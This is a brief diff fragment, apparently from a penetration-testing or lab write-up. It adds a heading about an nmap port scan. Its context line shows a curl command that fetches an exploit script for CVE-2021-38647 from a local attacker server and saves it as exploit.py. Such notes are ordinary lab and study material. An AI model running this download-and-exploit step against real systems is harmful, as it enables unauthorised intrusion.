@@ -103,8 +103,7 @@ curl http://192.168.134.38:8888/CVE-2021-38647.py -o exploit.py
 ----
 
 
-
-
+### after sending nmap and scan the for ports 
 
 
 
